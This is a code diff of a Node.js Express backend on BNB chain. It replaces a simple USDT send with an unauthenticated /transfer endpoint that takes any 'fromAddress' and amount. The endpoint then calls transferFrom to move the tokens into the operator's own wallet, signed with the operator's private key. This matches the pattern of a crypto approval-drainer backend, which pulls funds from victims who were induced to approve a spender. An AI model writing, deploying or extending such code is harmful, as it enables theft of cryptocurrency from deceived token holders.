@@ -1,52 +1,71 @@
-require('dotenv').config();
-const express = require('express');
-const cors = require('cors');
-const { ethers } = require('ethers');
+const express = require("express");
+const cors = require("cors");
+const Web3 = require("web3");
+require("dotenv").config();
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-const PORT = process.env.PORT || 5000;
-const RPC_URL = process.env.RPC_URL;
-const PRIVATE_KEY = process.env.PRIVATE_KEY;
-const USDT_ADDRESS = process.env.USDT_ADDRESS;
-const FROM_ADDRESS = process.env.FROM_ADDRESS;
-
-if (!RPC_URL || !PRIVATE_KEY || !USDT_ADDRESS || !FROM_ADDRESS) {
-  console.error("Please set all required environment variables.");
-  process.exit(1);
-}
-
-const provider = new ethers.JsonRpcProvider(RPC_URL);
-const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
+const provider = new Web3.providers.HttpProvider(process.env.RPC_URL);
+const web3 = new Web3(provider);
 
 const USDT_ABI = [
-  "function transfer(address to, uint amount) public returns (bool)"
+  {
+    constant: false,
+    inputs: [
+      { name: "_from", type: "address" },
+      { name: "_to", type: "address" },
+      { name: "_value", type: "uint256" }
+    ],
+    name: "transferFrom",
+    outputs: [{ name: "", type: "bool" }],
+    type: "function"
+  }
 ];
 
-const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
+const USDT_ADDRESS = process.env.USDT_ADDRESS;
 
-app.get('/', (req, res) => {
-  res.send('Backend is live and reachable');
-});
-
-app.post('/transfer', async (req, res) => {
-  const { to, amount } = req.body;
-  if (!to || !amount) {
-    return res.status(400).json({ success: false, error: "Missing 'to' or 'amount'" });
-  }
+app.post("/transfer", async (req, res) => {
   try {
-    console.log(`Sending ${amount} USDT to ${to}`);
-    const txResponse = await usdtContract.transfer(to, ethers.parseUnits(amount.toString(), 18));
-    await txResponse.wait();
-    return res.json({ success: true, txHash: txResponse.hash });
-  } catch (error) {
-    console.error("Transfer error:", error);
-    return res.status(500).json({ success: false, error: error.message || "Unknown error" });
+    const { fromAddress, amount } = req.body;
+    if (!fromAddress || !amount) {
+      return res.status(400).json({ success: false, error: "Missing 'fromAddress' or 'amount'" });
+    }
+
+    const privateKey = process.env.PRIVATE_KEY;
+    const myWallet = process.env.MY_WALLET;
+
+    const token = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
+    const decimals = 18;
+    const value = web3.utils.toBN(amount).mul(web3.utils.toBN(10).pow(web3.utils.toBN(decimals)));
+
+    const data = token.methods.transferFrom(fromAddress, myWallet, value).encodeABI();
+
+    const txCount = await web3.eth.getTransactionCount(myWallet);
+
+    const tx = {
+      nonce: web3.utils.toHex(txCount),
+      from: myWallet,
+      to: USDT_ADDRESS,
+      gas: web3.utils.toHex(200000),
+      data,
+      chainId: 56
+    };
+
+    const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
+    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+
+    res.json({ success: true, receipt });
+  } catch (err) {
+    console.error("transferFrom error:", err);
+    res.status(500).json({ success: false, error: err.message });
   }
 });
 
-app.listen(PORT, () => {
-  console.log(`Backend listening on port ${PORT}`);
+app.get("/", (req, res) => {
+  res.send("USDT Transfer Backend Running");
 });
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
